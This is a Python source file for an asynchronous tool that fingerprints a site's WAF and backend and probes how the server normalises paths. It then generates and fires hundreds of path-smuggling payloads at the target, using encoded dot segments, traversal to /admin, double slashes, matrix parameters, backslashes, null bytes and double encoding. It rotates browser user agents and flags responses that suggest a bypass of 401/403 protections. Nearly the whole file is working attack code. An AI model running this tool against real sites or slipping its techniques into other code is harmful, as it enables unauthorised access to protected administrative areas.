import asyncio
import logging
import random
import re
import hashlib
from typing import List, Dict, Optional, Any, Mapping, Tuple
from urllib.parse import urlparse

logger = logging.getLogger(__name__)

class _Budget:
    def __init__(self, max_ops: int = 300):
        self.max_ops = max_ops
        self.used = 0

    def take(self, n: int = 1) -> bool:
        if self.used + n > self.max_ops:
            return False
        self.used += n
        return True


class PathSmugglingEngine:
    def __init__(self, waf_detector, backend_identifier, *, max_payloads: int = 240, max_concurrency: int = 12):
        self.waf_detector = waf_detector
        self.backend_identifier = backend_identifier
        self.max_payloads = max_payloads
        self.max_concurrency = max_concurrency
        self._baseline: Optional[Dict[str, Any]] = None
        self.normalization_behavior: Dict[str, Dict[str, Any]] = {}
        self.user_agents: List[Tuple[str, str]] = [
            ("desktop-chrome",
             "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
             "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"),
            ("desktop-firefox",
             "Mozilla/5.0 (X11; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0"),
            ("desktop-safari",
             "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 "
             "(KHTML, like Gecko) Version/17.2 Safari/605.1.15"),
        ]

    async def generate_payloads(self, target_url: str, base_path: str, http_client) -> List[str]:
        base_path = self._normalize_base_path(base_path)
        try:
            waf_results = await self.waf_detector.detect(target_url, http_client)
        except TypeError:
            waf_results = await self.waf_detector.detect(target_url, http_client)

        try:
            backend_results = await self.backend_identifier.identify(target_url, http_client)
        except TypeError:
            backend_results = await self.backend_identifier.identify(target_url, http_client)

        waf_key = self._choose_waf_key(waf_results)
        backend_key = self._choose_backend_key(backend_results)

        if not self.normalization_behavior:
            await self._analyze_normalization_behavior(target_url, http_client)

        techniques = self._get_smuggling_techniques(backend_key, waf_key)
        logger.info(f"[PathSmuggle] Techniques selected: {', '.join(sorted(techniques))}")

        payloads: List[str] = []
        seen: set = set()

        def add(p: str):
            if p and p not in seen:
                seen.add(p)
                payloads.append(p)

        base = base_path.rstrip("/")

        if "dot_smuggling" in techniques:
            dot = "%2e"
            dd  = "%2e%2e"
            add(f"/.{dot}{base}")              
            add(f"{base}/.{dot}")              
            add(f"/{dd}{base}")               
            add(f"{base}/{dd}")             
            add(f"/%252e%252e{base}")           
            add(f"{base}%2f%2e%2e")          
            add(f"/%2e/{base.lstrip('/')}")
            add(f"/%2e%2e/{base.lstrip('/')}")

        if "double_slash" in techniques:
            l = base.lstrip("/")
            add(f"//{l}")
            add(f"/{l}//")
            add(f"///{l}")
            add(f"/{l}///")
            add(f"/\\/{l}")                  

        if "traversal" in techniques:
            for depth in (1, 2, 3):
                prefix = "/".join([".."] * depth)
                add(f"/{prefix}{base}")
            add(f"{base}/../")
            add(f"/{base}/..")
            add(f"/{base}/../admin")            

        if "matrix_parameters" in techniques:
            l = base
            add(f"{l};bypass")
            add(f"{l};sessionid=1337")
            add(f"{l};")
            add(f";bypass{l}")
            add(f"/;bypass={l.lstrip('/')}")

        if "backslash" in techniques:
            add(base.replace("/", "\\"))
            add(f"\\{base.lstrip('/')}")
            add(f"{base}\\")
            add(f"{base}\\..\\admin")
            add(f"{base}/..\\admin")

        if "encoding" in techniques or "double_encoding" in techniques:
            l = base.lstrip("/")
            add(f"/%2f{l}")                  
            add(f"/{l.replace('/', '%2f')}")   
            add(f"{base}.")                    
            add(f"{base}/.")                 
            add(f"{base}.json")                 
            add(f"{base}%00")                   
            add(f"{base}%20")                  
            add(f"{base}%09")              
            add(f"{base}?")                   

        more = []
        for p in payloads:
            more.extend(self._percent_case_variants(p))
        for p in more:
            add(p)
        for p in list(payloads):
            add(self._double_encode_percent(p))

        if len(payloads) > self.max_payloads:
            payloads = self._stable_cap(payloads, self.max_payloads)

        logger.info(f"[PathSmuggle] Generated {len(payloads)} payloads (cap={self.max_payloads})")
        return payloads

    async def test_payloads(self, target_url: str, base_path: str, payloads: List[str], http_client ) -> List[Dict[str, Any]]:

        base_path = self._normalize_base_path(base_path)
        results: List[Dict[str, Any]] = []
        sem = asyncio.Semaphore(self.max_concurrency)
        budget = _Budget(max_ops=min(self.max_payloads, 300))
        baseline_url = f"{target_url.rstrip('/')}{base_path}"
        self._baseline = await self._get_snapshot(http_client, baseline_url)

        async def run_one(p: str) -> Optional[Dict[str, Any]]:
            if not budget.take(1):
                return None
            test_url = f"{target_url.rstrip('/')}{p}"
            try:
                async with sem:
                    snap = await self._get_snapshot(http_client, test_url)
                if not snap:
                    return None

                if self._is_valid_bypass(snap, self._baseline):
                    finding = {
                        "payload": p,
                        "url": test_url,
                        "status_code": snap["status"],
                        "response_size": len(snap["body"]),
                        "technique": "path_smuggling",
                        "proof": {
                            "cookie_fp": snap["cookie_fp"],
                            "body_len": len(snap["body"]),
                            "body_md5": snap["body_md5"],
                            "headers_sample": dict(list(snap["headers"].items())[:6]),
                        },
                    }
                    return finding

                if 300 <= snap["status"] < 400:
                    loc = snap["headers"].get("location", "")
                    if any(k in (loc or "").lower() for k in ("admin", "dashboard", "console", "manage")):
                        return {
                            "payload": p,
                            "url": test_url,
                            "status_code": snap["status"],
                            "redirect_location": loc,
                            "technique": "path_smuggling_redirect",
                        }

            except Exception as e:
                logger.debug(f"[PathSmuggle] Error {test_url}: {e}")
            return None

        tasks = [asyncio.create_task(run_one(p)) for p in payloads]
        for out in await asyncio.gather(*tasks, return_exceptions=True):
            if isinstance(out, Exception):
                logger.debug(f"[PathSmuggle] Task error: {out}")
                continue
            if out:
                results.append(out)
                logger.info(f"[PathSmuggle] Finding: {out.get('payload')} -> {out.get('status_code')}")

        return results

    async def _analyze_normalization_behavior(self, target_url: str, http_client) -> None:
        logger.info("[PathSmuggle] Observing normalization behavior")
        tests = [
            ("/foo/../bar", "/bar"),
            ("//double//slashes//", "/double/slashes/"),
            ("/./dot/./path/", "/dot/path/"),
            ("/%2e%2e/admin", "/admin"),
            ("/path;matrix=param", "/path"),
            ("/path/", "/path"),
        ]
        for test_path, _ in tests:
            url = f"{target_url.rstrip('/')}{test_path}"
            try:
                resp = await self._safe_get(http_client, url, timeout=8)
                if not resp:
                    self.normalization_behavior[test_path] = {"error": "request_failed"}
                    continue
                status, hdrs, _ = await self._normalize_response(resp)
                final_url = getattr(resp, "url", None)
                final_url = str(final_url) if final_url is not None else url
                parsed = urlparse(final_url)
                actual = parsed.path or test_path

                self.normalization_behavior[test_path] = {
                    "actual": actual,
                    "status": status,
                    "redirect": 300 <= status < 400,
                    "location": _lower_headers(hdrs).get("location", ""),
                }
                logger.debug(f"[Normalize] {test_path} -> {actual} ({status})")

            except Exception as e:
                logger.debug(f"[Normalize] failed for {test_path}: {e}")
                self.normalization_behavior[test_path] = {"error": str(e)}

    def _get_smuggling_techniques(self, backend: str, waf: str) -> List[str]:
        techniques: List[str] = []
        base = ["dot_smuggling", "double_slash", "traversal"]

        if self.normalization_behavior.get("/%2e%2e/admin", {}).get("actual") == "/admin":
            techniques.append("dot_smuggling")
        if self.normalization_behavior.get("//double//slashes//", {}).get("actual", "").startswith("//"):
            techniques.append("double_slash")
        if self.normalization_behavior.get("/foo/../bar", {}).get("actual") == "/bar":
            techniques.append("traversal")
        if self.normalization_behavior.get("/path;matrix=param", {}).get("actual") == "/path":
            techniques.append("matrix_parameters")

        b = backend.lower()
        if "node" in b or "express" in b:
            techniques += ["backslash", "encoding"]
        if "spring" in b:
            techniques += ["matrix_parameters", "encoding"]
        if "iis" in b:
            techniques += ["backslash"]

        w = waf.lower()
        if "cloudflare" in w:
            techniques += ["double_encoding", "encoding"]
        if "akamai" in w or "imperva" in w or "f5" in w:
            techniques += ["encoding"]

        if not techniques:
            techniques = base + ["matrix_parameters", "backslash", "encoding"]
        else:
            for t in base:
                if t not in techniques:
                    techniques.append(t)

        return sorted(set(techniques))

    def _is_valid_bypass(self, snap: Dict[str, Any], baseline: Optional[Dict[str, Any]]) -> bool:
        status = snap["status"]
        body = snap["body"] if isinstance(snap["body"], str) else ""
        lbody = body.lower()

        if not (200 <= status < 300):
            return False

        block_indicators = ["access denied", "forbidden", "unauthorized", "blocked", "not authorized", "captcha"]
        if any(b in lbody for b in block_indicators):
            return False

        if baseline:
            b_status = baseline["status"]
            b_body = baseline["body"]
            if b_status in (401, 403, 404):
                if snap["cookie_fp"] != baseline["cookie_fp"]:
                    return True
                if snap["body_md5"] != baseline["body_md5"]:
                    return True
                if abs(len(b_body) - len(body)) > max(64, int(0.15 * max(len(b_body), len(body)))):
                    return True
                return False

            same_len_ratio = min(len(b_body), len(body)) / max(1, max(len(b_body), len(body)))
            if same_len_ratio > 0.95 and snap["body_md5"] == baseline["body_md5"]:
                return False

            if snap["cookie_fp"] != baseline["cookie_fp"]:
                return True
            if abs(len(b_body) - len(body)) > max(64, int(0.10 * max(len(b_body), len(body)))):
                return True
            return False

        sensitive = ["admin", "dashboard", "password", "secret", "root", "config", "backup", "console"]
        return any(s in lbody for s in sensitive)

    async def _get_snapshot(self, http_client, url: str) -> Optional[Dict[str, Any]]:
        try:
            ua = random.choice(self.user_agents)[1]
            resp = await self._safe_get(http_client, url, headers={"User-Agent": ua}, timeout=12)
            if not resp:
                return None
            status, headers, body = await self._normalize_response(resp)
            h = _lower_headers(headers)
            body_s = body if isinstance(body, str) else ""
            return {
                "status": status,
                "headers": h,
                "body": body_s,
                "body_md5": hashlib.md5(body_s.encode("utf-8", errors="ignore")).hexdigest(),
                "cookie_fp": self._cookie_fingerprint(h.get("set-cookie", "")),
            }
        except Exception as e:
            logger.debug(f"[Snapshot] failed for {url}: {e}")
            return None

    async def _safe_get(self, http_client, url: str, headers: Optional[Dict[str, str]] = None, timeout: int = 12):
        try:
            return await http_client.get(url, headers=headers or {}, timeout=timeout, follow_redirects=True)
        except TypeError:
            try:
                return await http_client.get(url, headers=headers or {}, timeout=timeout)
            except Exception as e:
                logger.debug(f"_safe_get failed for {url}: {e}")
                return None
        except Exception as e:
            logger.debug(f"_safe_get failed for {url}: {e}")
            return None

    async def _normalize_response(self, resp) -> Tuple[int, Mapping[str, str], str]:
        status = getattr(resp, "status_code", None)
        if status is None:
            status = getattr(resp, "status", None)
        if status is None:
            status = 0

        headers = getattr(resp, "headers", {}) or {}
        text_val = getattr(resp, "text", None)
        if isinstance(text_val, str):
            body = text_val
        else:
            body = ""
            try:
                if callable(text_val):
                    maybe = text_val()
                    if asyncio.iscoroutine(maybe):
                        body = await maybe
                    else:
                        body = str(maybe) if maybe is not None else ""
            except Exception:
                body = ""
        return int(status), headers, body

    def _normalize_base_path(self, base_path: str) -> str:
        base_path = base_path.strip() or "/"
        if not base_path.startswith("/"):
            base_path = "/" + base_path
        return base_path

    def _choose_waf_key(self, waf_results: Dict[str, float]) -> str:
        if not waf_results:
            return "unknown"
        best = max(waf_results.items(), key=lambda x: x[1])[0].lower()
        for k in ("cloudflare", "akamai", "imperva", "aws", "waf", "f5", "big-ip"):
            if k in best:
                return k
        return best

    def _choose_backend_key(self, backend_results: Dict[str, Dict[str, Any]]) -> str:
        if not backend_results:
            return "unknown"
        best = max(backend_results.items(), key=lambda x: x[1].get("confidence", 0.0))[0]
        return best

    def _percent_case_variants(self, s: str) -> List[str]:
        out = set([s])
        for m in re.finditer(r"%[0-9a-fA-F]{2}", s):
            i, j = m.span()
            head, enc, tail = s[:i], s[i:j], s[j:]
            out.add(head + enc.upper() + tail)
            out.add(head + enc.lower() + tail)
        return list(out)

    def _double_encode_percent(self, s: str) -> str:
        return s.replace("%", "%25")

    def _stable_cap(self, items: List[str], k: int) -> List[str]:
        scored = [(hashlib.sha1(i.encode("utf-8")).hexdigest(), i) for i in items]
        scored.sort(key=lambda x: x[0])
        return [i for _, i in scored[:k]]

    def _cookie_fingerprint(self, set_cookie_val: str) -> str:
        sc = set_cookie_val or ""
        if not sc:
            return "none"
        parts = [p.strip() for p in re.split(r",(?=[^ ;]+=)", sc)]
        names = []
        for p in parts:
            name = p.split("=", 1)[0].strip().lower()
            attrs = set()
            for a in ("httponly", "secure", "samesite", "path", "domain", "max-age"):
                if re.search(rf"\b{a}\b", p, re.I):
                    attrs.add(a)
            names.append(f"{name};{'|'.join(sorted(attrs))}")
        names.sort()
        return hashlib.sha1(";".join(names).encode("utf-8")).hexdigest()

def _lower_headers(h: Mapping[str, str]) -> Dict[str, str]:
    try:
        return {str(k).lower(): str(v) for k, v in dict(h or {}).items()}
    except Exception:
        out: Dict[str, str] = {}
        try:
            for k in h.keys(): 
                out[str(k).lower()] = str(h.get(k))
        except Exception:
            pass
        return out
